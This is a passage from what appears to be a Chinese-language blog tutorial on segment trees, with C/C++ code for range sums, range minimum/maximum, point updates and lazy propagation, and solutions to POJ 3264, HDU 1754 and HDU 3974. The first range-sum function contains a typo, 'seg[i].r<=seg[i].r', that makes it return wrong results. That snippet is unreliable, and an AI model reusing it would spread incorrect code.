class="number">1</span>,k,x);</span><br><span class="line">    seg[i].sum=seg[<span class="number">2</span>*i].sum+seg[<span class="number">2</span>*i+<span class="number">1</span>].sum;</span><br><span class="line">    seg[i].val=min(seg[<span class="number">2</span>*i].val,seg[<span class="number">2</span>*i+<span class="number">1</span>].val);</span><br><span class="line">&#125;</span><br><span class="line">update(<span class="number">1</span>,pos,x);</span><br></pre></td></tr></table></figure>
<p>更新操作在线段树的节点中维护，并不需要更新原有数组，原有数组信息仅在构建线段树的时候用到。</p>
<p>求区间和操作如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;=seg[i].l&amp;&amp;seg[i].r&lt;=seg[i].r)&#123;</span><br><span class="line">        <span class="keyword">return</span> seg[i].sum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=(seg[i].l+seg[i].r)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> suml=<span class="number">0</span>,sumr=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;=mid) suml=sum(<span class="number">2</span>*i,l,r);</span><br><span class="line">    <span class="keyword">if</span>(r&gt;mid) sumr=sum(<span class="number">2</span>*i+<span class="number">1</span>,l,r);</span><br><span class="line">    <span class="keyword">return</span> suml+sumr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也可以这么写：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l==seg[i].l&amp;&amp;seg[i].r==r)&#123;</span><br><span class="line">        <span class="keyword">return</span> seg[i].sum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=(seg[i].l+seg[i].r)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(r&lt;=mid) ans=sum(<span class="number">2</span>*i,l,r);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(l&gt;mid) ans=sum(<span class="number">2</span>*i+<span class="number">1</span>,l,r);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        ans+=sum(<span class="number">2</span>*i,l,mid);</span><br><span class="line">        ans+=sum(<span class="number">2</span>*i+<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>区间和操作应用树状数组同样可以高效查询、更新。</p>
<p>查询区间最小值的操作如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;=seg[i].l&amp;&amp;seg[i].r&lt;=r)&#123;</span><br><span class="line">        <span class="keyword">return</span> seg[i].val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> minl=inf,minr=inf;</span><br><span class="line">    <span class="keyword">int</span> mid=(seg[i].l+seg[i].r)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;=mid)&#123;</span><br><span class="line">        minl=query(<span class="number">2</span>*i,l,r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(r&gt;mid)&#123;</span><br><span class="line">        minr=query(<span class="number">2</span>*i+<span class="number">1</span>,l,r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> min(minl,minr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="http://poj.org/problem?id=3264">POJ 3264</a></p>
<p>求给定区间的最大值和最小值的差值，区间查询，没有更新操作，为静态查询。</p>
<p>由于查询返回应同时返回区间最小值和区间最大值，可以将区间最小值<code>ans1</code>,区间最大值<code>ans2</code>设为全局变量，在每次查询的时候更新，也可以返回将区间的最大值、最小值这两个参数以<code>pair</code>类型返回，会麻烦很多。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">200005</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> inf=<span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> l,r;</span><br><span class="line">    <span class="keyword">int</span> val1,val2;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> ans1,ans2;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line">Node seg[maxn*<span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    seg[i].l=l;</span><br><span class="line">    seg[i].r=r;</span><br><span class="line">    <span class="keyword">if</span>(l==r)&#123;</span><br><span class="line">        seg[i].val1=seg[i].val2=a[l];</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=(seg[i].l+seg[i].r)/<span class="number">2</span>;</span><br><span class="line">    build(<span class="number">2</span>*i,l,mid);</span><br><span class="line">    build(<span class="number">2</span>*i+<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">    seg[i].val1=min(seg[<span class="number">2</span>*i].val1,seg[<span class="number">2</span>*i+<span class="number">1</span>].val1);</span><br><span class="line">    seg[i].val2=max(seg[<span class="number">2</span>*i].val2,seg[<span class="number">2</span>*i+<span class="number">1</span>].val2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].val2&lt;=ans2&amp;&amp;seg[i].val1&gt;=ans1) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].l==l&amp;&amp;seg[i].r==r)&#123;</span><br><span class="line">        ans1=min(seg[i].val1,ans1);</span><br><span class="line">        ans2=max(seg[i].val2,ans2);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=(seg[i].l+seg[i].r)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(r&lt;=mid) query(<span class="number">2</span>*i,l,r);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(l&gt;mid) query(<span class="number">2</span>*i+<span class="number">1</span>,l,r);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        query(<span class="number">2</span>*i,l,mid);</span><br><span class="line">        query(<span class="number">2</span>*i+<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,q;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;q)==<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        build(<span class="number">1</span>,<span class="number">1</span>,n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=q;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> l,r;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;l,&amp;r);</span><br><span class="line">            ans1=inf,ans2=-inf;</span><br><span class="line">            query(<span class="number">1</span>,l,r);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans2-ans1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="http://acm.hdu.edu.cn/showproblem.php?pid=1754">hdu 1754</a></p>
<p>区间查询，查询区间最大值，更新操作更新单点的值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">200005</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> l,r;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">&#125;;</span><br><span class="line">Node seg[maxn*<span class="number">3</span>];</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    seg[i].l=l;</span><br><span class="line">    seg[i].r=r;</span><br><span class="line">    <span class="keyword">if</span>(l==r) seg[i].val=a[l];</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="keyword">int</span> mid=(l+r)/<span class="number">2</span>;</span><br><span class="line">         build(<span class="number">2</span>*i,l,mid);</span><br><span class="line">         build(<span class="number">2</span>*i+<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">         seg[i].val=max(seg[<span class="number">2</span>*i].val,seg[<span class="number">2</span>*i+<span class="number">1</span>].val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;=seg[i].l&amp;&amp;seg[i].r&lt;=r)&#123;</span><br><span class="line">        <span class="keyword">return</span> seg[i].val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=(seg[i].l+seg[i].r)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(r&lt;=mid) <span class="keyword">return</span> query(<span class="number">2</span>*i,l,r);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(l&gt;mid) <span class="keyword">return</span> query(<span class="number">2</span>*i+<span class="number">1</span>,l,r);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> max(query(<span class="number">2</span>*i,l,r),query(<span class="number">2</span>*i+<span class="number">1</span>,l,r));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> k,<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].l==k&amp;&amp;seg[i].r==k)&#123;</span><br><span class="line">        seg[i].val=x;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=(seg[i].l+seg[i].r)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(k&lt;=mid) update(<span class="number">2</span>*i,k,x);</span><br><span class="line">    <span class="keyword">else</span> update(<span class="number">2</span>*i+<span class="number">1</span>,k,x);</span><br><span class="line">    seg[i].val=max(seg[<span class="number">2</span>*i].val,seg[<span class="number">2</span>*i+<span class="number">1</span>].val);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m)==<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        build(<span class="number">1</span>,<span class="number">1</span>,n);</span><br><span class="line">        <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">            <span class="keyword">char</span> op[<span class="number">2</span>];</span><br><span class="line">            <span class="keyword">int</span> x,y;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s%d%d&quot;</span>, op,&amp;x,&amp;y);</span><br><span class="line">            <span class="keyword">if</span> (op[<span class="number">0</span>]==<span class="string">&#x27;Q&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">int</span> ans=query(<span class="number">1</span>,x,y);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ans);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                update(<span class="number">1</span>,x,y);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上写法是通过结构体来维护区间信息，也可以直接通过数组来存储信息，这种写法传入参数比较多，运行的时间复杂度长度可能大一些。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">200005</span>;</span><br><span class="line"><span class="keyword">int</span> val[maxn*<span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l==r)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;val[i]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=(l+r)/<span class="number">2</span>;</span><br><span class="line">    build(<span class="number">2</span>*i,l,mid);</span><br><span class="line">    build(<span class="number">2</span>*i+<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">    val[i]=max(val[<span class="number">2</span>*i],val[<span class="number">2</span>*i+<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> k,<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l==k&amp;&amp;r==k)&#123;</span><br><span class="line">        val[i]=x;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=(l+r)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(k&lt;=mid) update(<span class="number">2</span>*i,l,mid,k,x);</span><br><span class="line">    <span class="keyword">else</span> update(<span class="number">2</span>*i+<span class="number">1</span>,mid+<span class="number">1</span>,r,k,x);</span><br><span class="line">    val[i]=max(val[<span class="number">2</span>*i],val[<span class="number">2</span>*i+<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x&lt;=l&amp;&amp;r&lt;=y) <span class="keyword">return</span> val[i];</span><br><span class="line">    <span class="keyword">int</span> mid=(l+r)/<span class="number">2</span>,res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(x&lt;=mid) res=max(res,query(<span class="number">2</span>*i,l,mid,x,y));</span><br><span class="line">    <span class="keyword">if</span>(y&gt;mid) res=max(res,query(<span class="number">2</span>*i+<span class="number">1</span>,mid+<span class="number">1</span>,r,x,y));</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> n,m;</span><br><span class="line">   <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m)==<span class="number">2</span>)&#123;</span><br><span class="line">        build(<span class="number">1</span>,<span class="number">1</span>,n);</span><br><span class="line">        <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">            <span class="keyword">char</span> op[<span class="number">2</span>];</span><br><span class="line">            <span class="keyword">int</span> x,y;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s%d%d&quot;</span>, op,&amp;x,&amp;y);</span><br><span class="line">            <span class="keyword">if</span> (op[<span class="number">0</span>]==<span class="string">&#x27;Q&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">int</span> ans=query(<span class="number">1</span>,<span class="number">1</span>,n,x,y);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ans);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                update(<span class="number">1</span>,<span class="number">1</span>,n,x,y);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="区间更新和单点查询"><a href="#区间更新和单点查询" class="headerlink" title="区间更新和单点查询"></a>区间更新和单点查询</h1><p>树状数组通过差分思想来更新区间和查询单点，线段树则通过延迟标记来批量标记节点所对应的子区间。</p>
<p>延迟标记表示该节点$i$所对应的区间$[l,r]$同时执行了某个更新操作，比如同时赋值为某个值$x$。如此一来，不必每次更新操作都更新到$[l,r]$区间的叶子节点。</p>
<p>在查询区间或者更新区间仅仅涉及节点$i$的部分区间时，将延迟标记下放到节点的左孩子$2i$和右孩子$2i+1$对应的区间，同时将当前节点$i$的延迟标记清空。</p>
<h2 id="区间染色问题"><a href="#区间染色问题" class="headerlink" title="区间染色问题"></a>区间染色问题</h2><p><a href="http://acm.hdu.edu.cn/showproblem.php?pid=3974">hdu 3974</a></p>
<p>线段树维护dfs序，以邻接表形式来表示图，从根节点dfs，记录dfs过程中每个节点的dfs开始时间和结束时间，作为线段树中的次序。每个节点对应的下属必然是dfs中连续的一段区间，所以每次分配任务的时候对该节点dfs开始时间到dfs结束时间内的节点更新即可，为区间更新。每次查询查询点对应的任务值，为单点更新操作。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">50005</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to,next;</span><br><span class="line">&#125;;</span><br><span class="line">Edge edge[maxn];</span><br><span class="line"><span class="keyword">int</span> head[maxn],tot;</span><br><span class="line"><span class="keyword">int</span> cnt;</span><br><span class="line"><span class="keyword">int</span> start[maxn],en[maxn];</span><br><span class="line"><span class="keyword">int</span> vis[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cnt=<span class="number">0</span>;</span><br><span class="line">    tot=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(head,<span class="number">-1</span>,<span class="keyword">sizeof</span>(head));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addedge</span><span class="params">(<span class="keyword">int</span> u,<span class="keyword">int</span> v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    edge[tot].to=v;</span><br><span class="line">    edge[tot].next=head[u];</span><br><span class="line">    head[u]=tot++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ++cnt;</span><br><span class="line">    start[u]=cnt;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=head[u];i!=<span class="number">-1</span>;i=edge[i].next)&#123;</span><br><span class="line">        dfs(edge[i].to);</span><br><span class="line">    &#125;</span><br><span class="line">    en[u]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> l,r;</span><br><span class="line">    <span class="keyword">int</span> lazy;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">&#125;;</span><br><span class="line">Node seg[maxn*<span class="number">4</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    seg[i].l=l;</span><br><span class="line">    seg[i].r=r;</span><br><span class="line">    seg[i].val=<span class="number">-1</span>;</span><br><span class="line">    seg[i].lazy=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(l==r) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> mid=(l+r)/<span class="number">2</span>;</span><br><span class="line">    build(<span class="number">2</span>*i,l,mid);</span><br><span class="line">    build(<span class="number">2</span>*i+<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> v)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].l==l&amp;&amp;seg[i].r==r)&#123;</span><br><span class="line">        seg[i].val=v;</span><br><span class="line">        seg[i].lazy=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].lazy)&#123;</span><br><span class="line">        seg[<span class="number">2</span>*i].val=seg[i].val;</span><br><span class="line">        seg[<span class="number">2</span>*i+<span class="number">1</span>].val=seg[i].val;</span><br><span class="line">        seg[<span class="number">2</span>*i].lazy=seg[<span class="number">2</span>*i+<span class="number">1</span>].lazy=<span class="number">1</span>;</span><br><span class="line">        seg[i].lazy=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=(seg[i].l+seg[i].r)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(r&lt;=mid) update(<span class="number">2</span>*i,l,r,v);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(l&gt;mid) update(<span class="number">2</span>*i+<span class="number">1</span>,l,r,v);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        update(<span class="number">2</span>*i,l,mid,v);</span><br><span class="line">        update(<span class="number">2</span>*i+<span class="number">1</span>,mid+<span class="number">1</span>,r,v);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> u)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].l==u&amp;&amp;seg[i].r==u)&#123;</span><br><span class="line">        <span class="keyword">return</span> seg[i].val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].lazy)&#123;</span><br><span class="line">        seg[<span class="number">2</span>*i].val=seg[i].val;</span><br><span class="line">        seg[<span class="number">2</span>*i+<span class="number">1</span>].val=seg[i].val;</span><br><span class="line">        seg[<span class="number">2</span>*i].lazy=seg[<span class="number">2</span>*i+<span class="number">1</span>].lazy=<span class="number">1</span>;</span><br><span class="line">        seg[i].lazy=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=(seg[i].l+seg[i].r)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(u&lt;=mid) <span class="keyword">return</span> query(<span class="number">2</span>*i,u);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> query(<span class="number">2</span>*i+<span class="number">1</span>,u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;t);</span><br><span class="line">    <span class="keyword">int</span> icase=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Case #%d:\n&quot;</span>,icase++);</span><br><span class="line">        <span class="keyword">int</span> u,v;</span><br><span class="line">        <span class="built_in">memset</span>(vis,<span class="number">0</span>,<span class="keyword">sizeof</span>(vis));</span><br><span class="line">        init();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;u,&amp;v);</span><br><span class="line">            vis[u]=<span class="literal">true</span>;</span><br><span class="line">            addedge(v,u);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//找到根节点</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!vis[i])&#123;</span><br><span class="line">                dfs(i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        build(<span class="number">1</span>,<span class="number">1</span>,n);</span><br><span class="line">        <span class="keyword">int</span> m;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;m);</span><br><span class="line">        <span class="keyword">char</span> op[<span class="number">10</span>];</span><br><span class="line">        <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,op);</span><br><span class="line">            <span class="keyword">if</span>(op[<span class="number">0</span>]==<span class="string">&#x27;C&#x27;</span>)&#123;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;u);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,query(<span class="number">1</span>,start[u]));</span><br><span class="line">            &#125;</span><br><span 